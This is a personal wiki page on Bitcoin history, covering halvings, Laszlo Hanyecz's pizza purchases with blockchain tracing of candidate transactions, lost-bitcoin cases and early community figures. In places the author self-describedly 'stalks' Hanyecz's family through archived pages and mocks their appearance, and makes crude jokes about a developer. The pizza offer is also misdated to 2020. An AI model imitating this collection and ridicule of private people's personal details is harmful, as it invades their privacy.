[https://cointelegraph.com/learn/bitcoin-halving-how-does-the-halving-cycle-work-and-why-does-it-matter](https://cointelegraph.com/learn/bitcoin-halving-how-does-the-halving-cycle-work-and-why-does-it-matter) Happens every 210,000 blocks, aiming approximately at 4 year intervals. The historical dates were:
- 50 [BTC](#bitcoin) initially
- 1st: 2012: down to 25 [BTC](#bitcoin)
- 2nd: 2016: down to 12.5 [BTC](#bitcoin)
- 3rd: 2020: down to 6.25 [BTC](#bitcoin)

Each of these events prompts some commemorative [inscriptions](social-technology.md#inscription-blockchain): [Section "Halving messages"](cool-data-embedded-in-the-bitcoin-blockchain.md#halving-messages).

#### History of Bitcoin

↑ **Parent:** [Bitcoin](#bitcoin)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/History_of_Bitcoin)

- 2008-08-18: [bitcoin.org](#bitcoin-org) registered
- 2008-10-31: first public announcement at [https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html](https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html) by [satoshi@vistomail.com](#satoshi-at-vistomail-com)
- 2009-01-03: [Genesis block](#genesis-block) mined
- 2009-01-11: [First block not mined by Satoshi](#first-block-not-mined-by-satoshi)
- 2009-01-12: [First Bitcoin transactoin](#first-bitcoin-transactoin)
- 2010-05-18: the first of [Laszlo's pizzas](#laszlo-s-pizzas) at about $0.0045 / [BTC](#bitcoin)
- 2010-07-17: first trade happes on [Mt. Gox](#mt-gox) at $0.04951 / [BTC](#bitcoin): [https://cryptopotato.com/10-years-ago-first-bitcoin-trade-on-mt-gox-for-0-05-per-btc/](https://cryptopotato.com/10-years-ago-first-bitcoin-trade-on-mt-gox-for-0-05-per-btc/)
- 2014: [OP\_RETURN](#op-return) goes live

##### First Bitcoin transactoin

↑ **Parent:** [History of Bitcoin](#history-of-bitcoin)  
🏷️ **Tags:** [Bitcoin transaction](#bitcoin-transaction)

MOre precisely we of course mean the first non-[Coinbase transaction](#coinbase-transaction) obviously.

- [https://www.blockchain.com/explorer/transactions/btc/f4184fc596403b9d638783cf57adfe4c75c605f6356fbc91338530e9831e9e16](https://www.blockchain.com/explorer/transactions/btc/f4184fc596403b9d638783cf57adfe4c75c605f6356fbc91338530e9831e9e16)
- [https://www.blockchain.com/explorer/blocks/btc/170](https://www.blockchain.com/explorer/blocks/btc/170)

Using funds from block 9.

##### First mentions of bitcoin on

↑ **Parent:** [History of Bitcoin](#history-of-bitcoin)

###### First mentions of bitcoin on HackerNews

↑ **Parent:** [First mentions of bitcoin on](#first-mentions-of-bitcoin-on)

###### First mentions of bitcoin on Reddit

↑ **Parent:** [First mentions of bitcoin on](#first-mentions-of-bitcoin-on)

###### First mentions of bitcoin on YouTube

↑ **Parent:** [First mentions of bitcoin on](#first-mentions-of-bitcoin-on)

###### First mentions of bitcoin on public television

↑ **Parent:** [First mentions of bitcoin on](#first-mentions-of-bitcoin-on)

[https://twitter.com/pete_rizzo_/status/1746866155023671412](https://twitter.com/pete_rizzo_/status/1746866155023671412)

<h5 id="laszlo-s-pizzas">Laszlo's pizzas</h5>

↑ **Parent:** [History of Bitcoin](#history-of-bitcoin)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Laszlo's_pizzas)

On May 19, 2020, Lazlo announced on the [Bitcoin Forum](#bitcoin-forum) at: [https://bitcointalk.org/index.php?topic=137.msg1195](https://bitcointalk.org/index.php?topic=137.msg1195)

> I'll pay 10,000 [Bitcoins](#bitcoin) for a couple of pizzas.. like maybe 2 large ones so I have some left over for the next day.  I like having left over pizza to nibble on later.  You can make the pizza yourself and bring it to my house or order it for me from a delivery place, but what I'm aiming for is getting food delivered in exchange for bitcoins where I don't have to order or prepare it myself, kind of like ordering a 'breakfast platter' at a hotel or something, they just bring you something to eat and you're happy!
> 
> I like things like onions, peppers, sausage, mushrooms, tomatoes, pepperoni, etc.. just standard stuff no weird fish topping or anything like that.  I also like regular cheese pizzas which may be cheaper to prepare or otherwise acquire.
> 
> If you're interested please let me know and we can work out a deal.

[Ciro Santilli](ciro-santilli.md) remembers his father always telling him how when Ciro was small, he would try to grasp the value of money by converting it into how many pizzas he could buy. Well, at least he was not alone.

User bitcoin2paysafe then asks the fundamental practical question:

> In which country do you live?

and Lazslo replies:

> Jacksonville, Florida  
> zip code 32224  
> United States

User ender\_x then points out afterward:

> 10,000... Thats quite a bit.. you could sell those on [https://www.bitcoinmarket.com/](https://www.bitcoinmarket.com/) for $41 USD right now..

so it is a slightly bad deal even then!

Three days later Lazlo's asks again on the thread:

> So nobody wants to buy me pizza?  Is the bitcoin amount I'm offering too low?

and one day later he confirms that the sale was made  without naming the buyer:

> I just want to report that I successfully traded 10,000 bitcoins for pizza
> 
> Pictures: [http://heliacal.net/~solar/bitcoin/pizza/](http://heliacal.net/~solar/bitcoin/pizza/)
> 
> Thanks jercos!

where "jercos" is presumably the [Bitcoin Forum](#bitcoin-forum) username of the buyer. [https://en.bitcoin.it/wiki/Jercos](https://en.bitcoin.it/wiki/Jercos) gives his identity as [Jeremy Sturdivant](#jeremy-sturdivant).

[https://www.thesun.co.uk/news/15049566/other-bitcoin-pizza-jeremy-sturdivant-fortune-hanyecz/](https://www.thesun.co.uk/news/15049566/other-bitcoin-pizza-jeremy-sturdivant-fortune-hanyecz/) mentions Jeremy sold too early however:

> The cryptocash disappeared when Sturdivant used it to "cover expenses" while travelling the US with his girlfriend.

<a id="image-laszlo-s-papa-s-specialty-pizzas"></a>
![](https://web.archive.org/web/20200806030121im_/http://heliacal.net/~solar/bitcoin/pizza/.t/IMG_0984.small.jpg)

**[Figure 2](#image-laszlo-s-papa-s-specialty-pizzas). Laszlo's Papa's Specialty pizzas**. [Source](https://web.archive.org/web/20211219130004/http://heliacal.net/~solar/bitcoin/pizza/). The most famous of [Laszlo's pizzas](#laszlo-s-pizzas), originally published on his website: [https://web.archive.org/web/20210217220810/http://heliacal.net/~solar/bitcoin/lightning-pizza/](https://web.archive.org/web/20210217220810/http://heliacal.net/~solar/bitcoin/lightning-pizza/).

<a id="image-laszlo-s-secondary-pizza-event"></a>
![](https://web.archive.org/web/20211016070745im_/https://www.thesun.co.uk/wp-content/uploads/2021/05/NINTCHDBPICT000652509197-1.jpg?w=620)

**[Figure 3](#image-laszlo-s-secondary-pizza-event). Laszlo's secondary pizza event**. [Source](https://www.thesun.co.uk/news/15049566/other-bitcoin-pizza-jeremy-sturdivant-fortune-hanyecz). [https://web.archive.org/web/20210217220810/http://heliacal.net/~solar/bitcoin/lightning-pizza/](https://web.archive.org/web/20210217220810/http://heliacal.net/~solar/bitcoin/lightning-pizza/) documents another pizza event, as we have different pizza boxes from the most widely known one: [https://web.archive.org/web/20211219130004/http://heliacal.net/~solar/bitcoin/pizza/](https://web.archive.org/web/20211219130004/http://heliacal.net/~solar/bitcoin/pizza/) Only image thumbs are archived however. [https://web.archive.org/web/20211016070745/https://www.thesun.co.uk/news/15049566/other-bitcoin-pizza-jeremy-sturdivant-fortune-hanyecz/](https://web.archive.org/web/20211016070745/https://www.thesun.co.uk/news/15049566/other-bitcoin-pizza-jeremy-sturdivant-fortune-hanyecz/) however shows a large version that The Sun got their hands on before the takedown.

<a id="image-jeremy-sturdivant-pizza"></a>
![](https://web.archive.org/web/20211016070745im_/https://www.thesun.co.uk/wp-content/uploads/2021/05/COMP-CFP-BITCOIN-PIZZA.jpg?w=660)

**[Figure 4](#image-jeremy-sturdivant-pizza). Jeremy Sturdivant**. [Source](https://www.thesun.co.uk/news/15049566/other-bitcoin-pizza-jeremy-sturdivant-fortune-hanyecz/).

heliacal.net is presumably his personal website? But is was down as of 2023. But we have [Wayback Machine](website.md#wayback-machine) archives of course :-) Latest working one of that page 2021: [https://web.archive.org/web/20211219130004/http://heliacal.net/~solar/bitcoin/pizza/](https://web.archive.org/web/20211219130004/http://heliacal.net/~solar/bitcoin/pizza/) And some other stalking:
- [https://web.archive.org/web/20090812075412/http://heliacal.net/pmwiki](https://web.archive.org/web/20090812075412/http://heliacal.net/pmwiki)> Welcome to heliacal.net. This is the personal site of Laszlo Hanyecz. It's a place to hold various things I have an interest in or am working on.
- [https://web.archive.org/web/20091031044500/http://heliacal.net/pmwiki/Main/Cats](https://web.archive.org/web/20091031044500/http://heliacal.net/pmwiki/Main/Cats) he's a mega cat owner
- At [https://web.archive.org/web/20091031044606/http://heliacal.net/pmwiki/Main/Jackie](https://web.archive.org/web/20091031044606/http://heliacal.net/pmwiki/Main/Jackie) we get to stalk his wife a bit:

  > On March 10, 2007 I became the husband of the most wonderful woman in the world. We live in a nice house in Jacksonville, FL next to the University of North Florida.

  <a id="image-laszlo-hanyecz-s-wedding-picture"></a>
  <img src="https://web.archive.org/web/20190619235620im_/http://heliacal.net/~solar/images/wedding/posed/.t/AB3_1081.small.jpg" alt="" height="600">

  **[Figure 5](#image-laszlo-hanyecz-s-wedding-picture). Laszlo Hanyecz's wedding picture**. [Source](https://web.archive.org/web/20091031044606/http://heliacal.net/pmwiki/Main/Jackie). They are actually both physically rather similar, quite short and plumpy. Too much pizza maybe? Just kidding, they look like a great match!
- [https://web.archive.org/web/20030805153714/http://heliacal.net/~solar/](https://web.archive.org/web/20030805153714/http://heliacal.net/~solar/) that home has some files, partly early piracy
Laszlo is truly, literally, the nerd who got very very very lucky!!!

TODO [Who bought Laszlo Hanyecz pizza?](#who-bought-laszlo-hanyecz-pizza)!!!

On June 12, 2010 Laszlo re-offers:

> This is an open offer by the way.. I will trade 10,000 [BTC](#bitcoin) for 2 of these pizzas any time as long as I have the funds (I usually have plenty).  If anyone is interested please let me know.  The exchange is favorable for anyone who does it because the 2 pizzas are only about 25 dollars total, maybe 30 if you give the guy a nice tip.  If you get me the upgraded extra large ones or something, I can throw in some more bitcoins, just let me know and we'll work something out.
> 
> My 1 year old daughter really enjoys pizza too!  She just smears it all over her face if you give her a whole slice, but she does eventually manage to get most of it in her mouth (minus a few loose toppings of course).

and on August 4 user MoonShadow takes him up:

> An open offer, you say?  It's been a while since you had some pizza.  Feeling a craving, Laszlo?

but finally Laszlo withdrawls the offer:

> Well I didn't expect this to be so popular but I can't really afford to keep doing it since I can't generate thousands of coins a day anymore. Thanks to everyone who bought me pizza already but I'm kind of holding off on doing any more of these for now.

so we understand that the sales happened multiple times!!! Also, we understand that he was probably a miner.

TODO list all of the potential sales.

Bibliography:
- [https://en.bitcoin.it/wiki/Laszlo_Hanyecz](https://en.bitcoin.it/wiki/Laszlo_Hanyecz)

###### Jeremy Sturdivant

↑ **Parent:** [Laszlo's pizzas](#laszlo-s-pizzas)

[https://en.bitcoin.it/wiki/Jercos](https://en.bitcoin.it/wiki/Jercos) mentions:

> According to jercos the transaction was finalized over IRC chats. Jercos was 18 at the time of the transaction.

[https://www.bitcoinwhoswho.com/jercosinterview](https://www.bitcoinwhoswho.com/jercosinterview) is the source. Persumably the contact was initiated via the private messaging feature of the [Bitcoin Forum](#bitcoin-forum).

<a id="image-jeremy-sturdivant"></a>
![](https://web.archive.org/web/20211016070745im_/https://www.thesun.co.uk/wp-content/uploads/2021/05/COMP-CFP-BITCOIN-PIZZA.jpg?w=660)

**[Figure 6](#image-jeremy-sturdivant). Jeremy Sturdivant**. [Source](https://www.thesun.co.uk/news/15049566/other-bitcoin-pizza-jeremy-sturdivant-fortune-hanyecz/).

Bibliography:  
[https://en.bitcoin.it/wiki/Jercos](https://en.bitcoin.it/wiki/Jercos)

###### Who bought Laszlo Hanyecz pizza?

↑ **Parent:** [Laszlo's pizzas](#laszlo-s-pizzas)

TODO who bought the Bitcoins? Is anyone else besides [Jeremy Sturdivant](#jeremy-sturdivant)

The original forum thread [https://bitcointalk.org/index.php?topic=137.msg1195](https://bitcointalk.org/index.php?topic=137.msg1195) suggests multiple purchases were made, until he had to withdrawl the offer. Perhaps an easier question is how many pizzas he got in the first place.

[https://www.reddit.com/r/Bitcoin/comments/13on6px/comment/jl55025/?utm_source=reddit&utm_medium=web2x&context=3](https://www.reddit.com/r/Bitcoin/comments/13on6px/comment/jl55025/?utm_source=reddit&utm_medium=web2x&context=3) mentions without source:

> I know. Laszlo Hanyecz estimates that he spent 100,000 [BTC](#bitcoin) on pizza in 2010. Laszlo is the man that invented [GPU](computer-hardware.md#graphics-processing-unit) mining and he mined well over 100,000 [BTC](#bitcoin).

One source is: [https://bitcoinmagazine.com/culture/the-man-behind-bitcoin-pizza-day-is-more-than-a-meme-hes-a-mining-pioneer](https://bitcoinmagazine.com/culture/the-man-behind-bitcoin-pizza-day-is-more-than-a-meme-hes-a-mining-pioneer)

Related thread from May 2023: [https://bitcointalk.org/index.php?topic=5453728.msg62286606#msg62286606](https://bitcointalk.org/index.php?topic=5453728.msg62286606#msg62286606) "Did Laszlo Hanyecz exchange 40000 [BTC](#bitcoin) for 8 pizzas, not 10000 [BTC](#bitcoin) for 2 pizzas?" but their Googling is so bad no one had found the 100,000 quote before Ciro.

As per [https://bitcoin.stackexchange.com/questions/113831/searching-the-blockchain-based-on-transaction-amount-and-or-date](https://bitcoin.stackexchange.com/questions/113831/searching-the-blockchain-based-on-transaction-amount-and-or-date) at [https://blockchair.com/bitcoin/outputs?s=time(asc)&q=value(1000000000000),time(2010-05-18..2010-08-05)](https://blockchair.com/bitcoin/outputs?s=time(asc)&q=value(1000000000000),time(2010-05-18..2010-08-05)) we can list all the transactions made between the offer and withdrawal dates for value exactly 10k. There are only about 20 of them, and including someone the 22nd of May, so it is extremely likely that this will contain the hits. No repeated recipients however, so it is hard to progress with more advanced analytics tools

Some of the transactions are:
- [49d2adb6e476fa46d8357babf78b1b501fd39e177ac7833124b3f67b17c40c2a](https://www.blockchain.com/explorer/transactions/btc/49d2adb6e476fa46d8357babf78b1b501fd39e177ac7833124b3f67b17c40c2a) (22 May 2010 06:17:59 GMT+1). This one has some [Google](google.md) mentions:
  - [https://github.com/bitcoinbook/bitcoinbook/blob/6c472dd00b649b18b6ca6bbcc8ba23775619ce08/appdx-pycoin.asciidoc](https://github.com/bitcoinbook/bitcoinbook/blob/6c472dd00b649b18b6ca6bbcc8ba23775619ce08/appdx-pycoin.asciidoc)
  - [https://github.com/richardkiss/pycoin/blob/367a58e25aacf85549a7335f7607ba8a53727c81/COMMAND-LINE-TOOLS.md](https://github.com/richardkiss/pycoin/blob/367a58e25aacf85549a7335f7607ba8a53727c81/COMMAND-LINE-TOOLS.md)
  This is a highly unusual transaction from a single address [17WFx2GQZUmh6Up2NDNCEDk3deYomdNCfk](https://www.blockchain.com/explorer/addresses/btc/17WFx2GQZUmh6Up2NDNCEDk3deYomdNCfk) to a single address [1CZDM6oTttND6WPdt3D6bydo7DYKzd9Qik](https://www.blockchain.com/explorer/addresses/btc/1CZDM6oTttND6WPdt3D6bydo7DYKzd9Qik) for the exact value with no [change](#change-bitcoin).

  By digging a bit, we see that the input comes from exactly 20 outputs, e.g. [1E43t1VCc3Q3STKauEiUoVqLbT81XT67xj](https://www.blockchain.com/explorer/addresses/btc/1E43t1VCc3Q3STKauEiUoVqLbT81XT67xj), each of which is a block reward of 50 BTC, the [reward value at those early times](#bitcoin-halving), thus satisfactorily explaining how the exact 10k value was obtained without [change](#change-bitcoin). Because we know that Laszlo was a big [GPU](computer-hardware.md#graphics-processing-unit) miner, it is extremelly likely that this transaction was made by him.
- [a1075db55d416d3ca199f55b6084e2115b9345e16c5cf302fc80e9d5fbf5d48d](https://www.blockchain.com/explorer/transactions/btc/a1075db55d416d3ca199f55b6084e2115b9345e16c5cf302fc80e9d5fbf5d48d) (22 May 2010 07:16:31 GMT+1) also has several [Google](google.md) mentions, e.g.:
  - [https://tokenview.medium.com/bitcoin-pizza-day-the-story-of-buying-pizza-with-10-000-btc-54cd0896f9f1](https://tokenview.medium.com/bitcoin-pizza-day-the-story-of-buying-pizza-with-10-000-btc-54cd0896f9f1)

  [https://www.blockchain.com/explorer/transactions/btc/a1075db55d416d3ca199f55b6084e2115b9345e16c5cf302fc80e9d5fbf5d48d](https://www.blockchain.com/explorer/transactions/btc/a1075db55d416d3ca199f55b6084e2115b9345e16c5cf302fc80e9d5fbf5d48d) even specially marks it "Bitcoin Pizza" and "Notable". Furthermore, the receiving address [17SkEw2md5avVNyYgj6RiXuQKNwkXaxFyQ](https://www.blockchain.com/explorer/addresses/btc/17SkEw2md5avVNyYgj6RiXuQKNwkXaxFyQ) is even marked as verified an as belonging to [Jeremy Sturdivant](#jeremy-sturdivant).

  Furthermore this also shows us how Jeremy then transferred about half of Bitcoins 10 minutes later, but we can't know if it was to his own accounts or to cash out.

  The nature of this transaction is very different from the previous one. It uses a bunch of inputs to a single address [1XPTgDRhN8RFnzniWCddobD9iKZatrvH4](https://www.blockchain.com/explorer/addresses/btc/1XPTgDRhN8RFnzniWCddobD9iKZatrvH4). 1XPTgDRhN8RFnzniWCddobD9iKZatrvH4 contains a mixture of regular small inputs, but also a bunch of block rewards e.g. [https://www.blockchain.com/explorer/addresses/btc/1MUoh2nJudSDdKu9NkcevaCG1Qe3nZHWFZ](https://www.blockchain.com/explorer/addresses/btc/1MUoh2nJudSDdKu9NkcevaCG1Qe3nZHWFZ), thus also clearly indicating Lsazlo ownership.
8 [d1a429c05868f9be6cf312498b77f4e81c2d4db3268b007b6b80716fb56a35ad](https://www.blockchain.com/explorer/transactions/btc/d1a429c05868f9be6cf312498b77f4e81c2d4db3268b007b6b80716fb56a35ad) (29 May) is a common looking transaction with a single input from [1Bc7T7ygkKKvcburmEg14hJKBrLD7BXCkX](https://www.blockchain.com/explorer/addresses/btc/1Bc7T7ygkKKvcburmEg14hJKBrLD7BXCkX) and two outputs, one likely being the change to [1GH4dRUAagj67XVjr4TV6J9RFNmGYsLe7c](https://www.blockchain.com/explorer/addresses/btc/1GH4dRUAagj67XVjr4TV6J9RFNmGYsLe7c) and the other the actual value to [138eoqfNcEdeU9EG9CKfAxnYYz62uHRNrA](https://www.blockchain.com/explorer/addresses/btc/138eoqfNcEdeU9EG9CKfAxnYYz62uHRNrA).

  The input chain is complex, but it does contain one block reward on the third level: [17PBFeDzks3LzBTyt6bAMATNhowrvx5kBw](https://www.blockchain.com/explorer/addresses/btc/17PBFeDzks3LzBTyt6bAMATNhowrvx5kBw) + 79 rewards 4th level at [045795627ca29ec72a94c23a65ee775ea1949d60b6fba0938b75e1cfe1e6643e](https://www.blockchain.com/explorer/transactions/btc/045795627ca29ec72a94c23a65ee775ea1949d60b6fba0938b75e1cfe1e6643e).
- [d3498960e5f73031f726cb878382cc696938810fa43f918696cbf242afc9765e](https://www.blockchain.com/btc/tx/d3498960e5f73031f726cb878382cc696938810fa43f918696cbf242afc9765e) (04 June): complex chain, unclear
- [2ea2914c131b2798041a80c00c44081a3559233d69d8b367e4244e6b12096610](https://www.blockchain.com/explorer/transactions/btc/2ea2914c131b2798041a80c00c44081a3559233d69d8b367e4244e6b12096610) (10 June): single input/single output. Complex input, but has some 2nd order mines e.g. [e6393f613ef12f5708fa511875b8ff5080f6c8864709f8d92bd99435826a9d0d](https://www.blockchain.com/explorer/transactions/btc/e6393f613ef12f5708fa511875b8ff5080f6c8864709f8d92bd99435826a9d0d)
- [ea595789878b673776d0577cbc6063db611bb4e2954e226459d556995f547922](https://www.blockchain.com/explorer/transactions/btc/ea595789878b673776d0577cbc6063db611bb4e2954e226459d556995f547922) (24 June): single input/single output. Complex input, but has some 2nd order mines e.g. [b9a0c2d24a744b79fe001a67468c456746b74e94a6ce68a2e5f80bf645d678b9](https://www.blockchain.com/explorer/transactions/btc/b9a0c2d24a744b79fe001a67468c456746b74e94a6ce68a2e5f80bf645d678b9)
- [461f91a98bbe2f269d8af938039e185287761677f0418fcc8238c5f3dca72935](https://www.blockchain.com/explorer/transactions/btc/461f91a98bbe2f269d8af938039e185287761677f0418fcc8238c5f3dca72935) (02 Jul 2010 08:39:17 GMT+1): single 20k input to two 10k outputs. Did he get 2x two pizzas at once? Complex input.
- [a47f927ca1adeeb4394200e8a37a9297b07e784a251569074a9fc2c04855560f](https://www.blockchain.com/explorer/transactions/btc/a47f927ca1adeeb4394200e8a37a9297b07e784a251569074a9fc2c04855560f) (02 Jul 2010 09:07:35 GMT+1): too close in time to the previous one, unless he was having a massive pizza party with invitees!
- [77036fa2ac75212be1ce93e8e1008d5cb2bcbb51aa560a5fe29c9c1423bbd00e](https://www.blockchain.com/explorer/transactions/btc/77036fa2ac75212be1ce93e8e1008d5cb2bcbb51aa560a5fe29c9c1423bbd00e) (02 Jul 2010 09:14:33 GMT+1): the party grows even larger

##### Lost Bitcoin case

↑ **Parent:** [History of Bitcoin](#history-of-bitcoin)

###### James Howells

↑ **Parent:** [Lost Bitcoin case](#lost-bitcoin-case)

- [https://www.linkedin.com/in/howelzy/](https://www.linkedin.com/in/howelzy/)> Might know a thing or two about landfills.

  Epic.
- [https://www.independent.co.uk/news/uk/home-news/lost-bitcoin-crypto-james-howells-b2406517.html](https://www.independent.co.uk/news/uk/home-news/lost-bitcoin-crypto-james-howells-b2406517.html)> The bizarre saga started in 2013 when Mr Howells, put the hardware from an old laptop that contained 8,000 bitcoins, the world’s leading cryptocurrency, in a black bag in his hallway.
  > 
  > "I was doing a clear-out in my office and put a lot of items into a bag which I then placed at the front door of my house," he said. "I woke up the next morning and my ex-partner had already taken the bags to the landfill site; she thought she was doing me a favour, it wasn’t her fault."
- [https://www.bbc.co.uk/news/uk-wales-67297013](https://www.bbc.co.uk/news/uk-wales-67297013)

###### Stefan Thomas

↑ **Parent:** [Lost Bitcoin case](#lost-bitcoin-case)

[https://www.nytimes.com/2021/01/12/technology/bitcoin-passwords-wallets-fortunes.html](https://www.nytimes.com/2021/01/12/technology/bitcoin-passwords-wallets-fortunes.html)

> As for his lost password and inaccessible Bitcoin, Mr. Thomas has put the IronKey in a secure facility - he won’t say where - in case cryptographers come up with new ways of cracking complex passwords. Keeping it far away helps him try not to think about it, he said.



> “I would just lay in bed and think about it," Mr. Thomas said.

<a id="video-what-is-bitcoin-v1-by-weusecoins-2011"></a>
**[Video 1](#video-what-is-bitcoin-v1-by-weusecoins-2011). What is Bitcoin? (v1) by WeUseCoins (2011)** [Source](https://www.youtube.com/watch?v=Um63OQz3bjo). This is the video that [Stefan Thomas](#stefan-thomas) as paid 7,002 [Bitcoins](#bitcoin) to make back in 2011.

#### Bitcoin community

↑ **Parent:** [Bitcoin](#bitcoin)

##### Bitcoin Forum

↑ **Parent:** [Bitcoin community](#bitcoin-community)

[https://bitcointalk.org](https://bitcointalk.org)

Good article about its history: [https://en.bitcoin.it/wiki/BitcoinTalk](https://en.bitcoin.it/wiki/BitcoinTalk)

Founded by [Satoshi Nakamoto](#satoshi-nakamoto), making it the earliest and one of the most important [Bitcoin](#bitcoin) communities. TODO official in any way? Who founded it?

Instance of [Simple Machines Forum](https://ourbigbook.com/go/topic/simple-machines-forum), an [open source](software.md#open-source-software), [PHP](programming-language.md#php)-based forum system.

Some notable appearances:
- in 2010, it is where [Laszlo's pizzas](#laszlo-s-pizzas) offer was announced
- it was used e.g. on the [Mt. Gox](#mt-gox) investigation: [https://youtu.be/tJ-TsrK6SuY?t=2018](https://youtu.be/tJ-TsrK6SuY?t=2018)
- Jimmy Zhong's investigation: [https://youtu.be/pxvd1YOMGxU?t=1004](https://youtu.be/pxvd1YOMGxU?t=1004)

##### Bitcoin IRC channel

↑ **Parent:** [Bitcoin community](#bitcoin-community)  
🏷️ **Tags:** [IRC](messaging-software.md#internet-relay-chat)

A lot of important development discussion happened in those channels: [https://en.bitcoin.it/wiki/IRC_channels](https://en.bitcoin.it/wiki/IRC_channels)

At [https://www.reddit.com/r/Bitcoin/comments/5pvp6m/is_there_a_log_for_the_bitcoin_irc_channel/](https://www.reddit.com/r/Bitcoin/comments/5pvp6m/is_there_a_log_for_the_bitcoin_irc_channel/) "Is there a log for the [bitcoin](https://ourbigbook.com/go/topic/bitcoin) IRC channel?" [Luke Dashjr](#luke-dashjr) comments:

> No, it is meant to be private without logging allowed.

User "midmagic" (TODO identify) then comments:

> The \#bitcoin channel on Freenode is "officially unlogged." That means we officially don't publish the logs anywhere, and if we find that logs are published somewhere, we ask that they be taken down

Some [IRC](messaging-software.md#internet-relay-chat) logs were dumped into the [Bitcoin blockchain](#bitcoin) at: [IRC log dumps](cool-data-embedded-in-the-bitcoin-blockchain.md#irc-log-dumps) where they cannot be deleted.

##### Bitcoin Foundation

↑ **Parent:** [Bitcoin community](#bitcoin-community)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Bitcoin_Foundation)

##### Bitcoin person

↑ **Parent:** [Bitcoin community](#bitcoin-community)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Bitcoin_person)

###### Bitcoin developer

↑ **Parent:** [Bitcoin person](#bitcoin-person)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Bitcoin_developer)

###### Gavin Andresen

↑ **Parent:** [Bitcoin developer](#bitcoin-developer)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Gavin_Andresen)

###### Luke Dashjr

↑ **Parent:** [Bitcoin developer](#bitcoin-developer)  
🏷️ **Tags:** [Bitcoin miner](#bitcoin-miner)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Luke_Dashjr)

Accounts:
- [https://twitter.com/lukedashjr](https://twitter.com/lukedashjr) on [Twitter](social-technology.md#twitter). Status as of January 2024:> father of 10 children

  This dude doesn't [fuck](biology.md#sexual-intercourse) around. Or perhaps he only [fucks](biology.md#sexual-intercourse) around. Either way.
- [https://www.linkedin.com/in/lukedashjr/](https://www.linkedin.com/in/lukedashjr/) on [LinkedIn](social-technology.md#linkedin)
- [https://bitcointalk.org/index.php?action=profile;u=3318](https://bitcointalk.org/index.php?action=profile;u=3318) on [bitcointalk.org](#bitcoin-forum)
- [https://www.reddit.com/user/luke-jr/](https://www.reddit.com/user/luke-jr/)
- [https://github.com/sponsors/luke-jr](https://github.com/sponsors/luke-jr)
- freenode username: `luke-jr`, mentioned e.g. at [https://bitcointalk.org/index.php?topic=38007.0](https://bitcointalk.org/index.php?topic=38007.0) from [Section "Prayer wars"](cool-data-embedded-in-the-bitcoin-blockchain.md#prayer-wars)

Author of the prayer side of the [Prayer wars](cool-data-embedded-in-the-bitcoin-blockchain.md#prayer-wars).

Creator of [Eligius pool](#eligius-pool) [Bitcoin mining pool](#bitcoin-mining-pool).

According to [LinkedIn](social-technology.md#linkedin) he studied at the [Benedictine College in Kansas](https://en.wikipedia.org/wiki/Benedictine_College).

TODO is his real birthname "Luke Dash Jr."?

Apparently he had his coins stolen in January 2023, then worth $3.5m: [https://blog.cryptostars.is/luke-dashjr-an-original-bitcoin-developer-loses-all-his-btc-88421c395ce5p](https://blog.cryptostars.is/luke-dashjr-an-original-bitcoin-developer-loses-all-his-btc-88421c395ce5p)...

[https://www.reddit.com/r/Buttcoin/comments/4936kw/lukejr_is_a_seriously_a_super_crazy_person_quotes/](https://www.reddit.com/r/Buttcoin/comments/4936kw/lukejr_is_a_seriously_a_super_crazy_person_quotes/) "Luke-Jr is a seriously a super crazy person quotes gigathread." (2016) on [Reddit](website.md#reddit). Apparently he has some fun views of life.

![](https://web.archive.org/web/20230603152934im_/https://www.weusecoins.com/images/luke-dashjr.png)

**[Figure 7](#_391)** [Source](https://www.weusecoins.com/luke-dashjr/).

###### Satoshi Nakamoto

↑ **Parent:** [Bitcoin developer](#bitcoin-developer)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Satoshi_Nakamoto)

[bitcoin.org](#bitcoin-org) registration: 2008-08-18

2008-08-22: first private contact to [Wei Dai](#wei-dai) email. Reproduced at [https://www.gwern.net/docs/bitcoin/2008-nakamoto](https://www.gwern.net/docs/bitcoin/2008-nakamoto) on [gwern.net](software.md#gwern-net) from address `satoshi@anonymousspeech.com`. Email provider shutting down entirely on 2021-09-30 as per [https://archive.ph/wip/RRNKx](https://archive.ph/wip/RRNKx), homepage now juts contains useless Bitcoin stuff.

First public [Bitcoin whitepaper](#bitcoin-whitepaper) announcement: 2008-10-31 [https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html](https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html) linking to [http://www.bitcoin.org/bitcoin.pdf](http://www.bitcoin.org/bitcoin.pdf), email sent from from [satoshi@vistomail.com](#satoshi-at-vistomail-com). Claimed one year and a half development time. Provider apparently closed in 2014: [https://www.reddit.com/r/Bitcoin/comments/3h80mi/vistomailcom_closed_and_domain_changed_owner_in/](https://www.reddit.com/r/Bitcoin/comments/3h80mi/vistomailcom_closed_and_domain_changed_owner_in/), as of 2021 just reads:

> Once upon a time a man paid me a visit in cyberspace, at this very domain. He planted a seed in our heads that would become the path we are walking today.

Replies in November: [https://www.metzdowd.com/pipermail/cryptography/2008-November/thread.html#14863](https://www.metzdowd.com/pipermail/cryptography/2008-November/thread.html#14863) under satoshi@anonymousspeech.com claims source code shared privately by request at that point.

First open source release: 9 January 2009. Announcement: [https://www.metzdowd.com/pipermail/cryptography/2009-January/014994.html](https://www.metzdowd.com/pipermail/cryptography/2009-January/014994.html) "Windows only for now. Open source C++ code is included" Arghhhhhh how can those libertarians use [Microsoft Windows](microsoft.md#microsoft-windows)??? Had a [GUI](software.md#graphical-user-interface) already.

2011-04-23 Satoshi sent his last email ever, it was to Martti Malmi. [https://www.nytimes.com/2015/05/17/business/decoding-the-enigma-of-satoshi-nakamoto-and-the-birth-of-bitcoin.html](https://www.nytimes.com/2015/05/17/business/decoding-the-enigma-of-satoshi-nakamoto-and-the-birth-of-bitcoin.html) mentions:

> May 2011 was also the last time Satoshi communicated privately with other Bitcoin contributors. In an email that month to Martti Malmi, one of the earliest participants, Satoshi wrote, "I've moved on to other things and probably won't be around in the future."

How Satoshi hid his mining [IP address](computer.md#ip-address):
